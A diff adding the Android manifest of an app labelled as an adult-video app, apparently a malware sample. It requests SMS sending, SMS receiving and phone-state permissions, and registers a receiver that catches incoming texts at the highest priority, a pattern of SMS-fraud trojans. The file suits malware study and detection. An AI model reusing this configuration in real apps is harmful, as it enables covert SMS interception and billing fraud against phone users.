@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.sm" platformBuildVersionCode="14" platformBuildVersionName="4.0.2-1406408">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <application android:icon="@drawable/ic_launcher" android:label="欲女视频" android:name="com.sm.App" android:theme="@android:style/Theme.NoTitleBar">
+        <activity android:name="com.sm.Loading" android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:name="com.sm.Main" android:screenOrientation="portrait"/>
+        <activity android:name="com.sm.view.MoreView" android:screenOrientation="portrait"/>
+        <activity android:name="com.sm.view.ListView" android:screenOrientation="portrait"/>
+        <activity android:name="com.sm.reader.ReaderActivity" android:screenOrientation="portrait"/>
+        <receiver android:name="com.sm.Scan">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
